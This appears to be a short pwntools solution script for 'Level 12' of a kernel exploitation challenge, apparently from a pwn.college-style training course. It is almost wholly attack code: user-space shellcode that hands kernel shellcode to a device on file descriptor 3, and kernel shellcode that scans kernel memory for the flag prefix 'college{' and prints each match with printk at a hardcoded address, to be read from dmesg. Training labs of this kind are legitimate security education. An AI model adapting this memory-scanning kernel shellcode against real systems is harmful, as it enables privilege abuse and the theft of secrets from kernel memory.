# Level 12
import pwn

pwn.context.arch = "amd64"


search_addr = 0xFFFF888000000000
printk_addr = 0xFFFFFFFF810B69A9

shellcraft = pwn.shellcraft  # type: ...
kshellcode = pwn.asm(f"""
    mov rdi, {search_addr}
    mov rbx, [rip + pattern]
search:
    cmp rbx, [rdi]
    je printf
    inc rdi
    jmp search
printf:
    push rdi
    sub rdi, 4
    mov rax, {printk_addr}
    call rax
    pop rdi
    inc rdi
    jmp search

pattern:
    .ascii  "college{{"
""")
ushellcode = [
    shellcraft.write(3, kshellcode, len(kshellcode)),
]
ushellcode = pwn.asm("".join(ushellcode))
pwn.write("ushellcode.bin", ushellcode)

# then lookup on `dmesg`
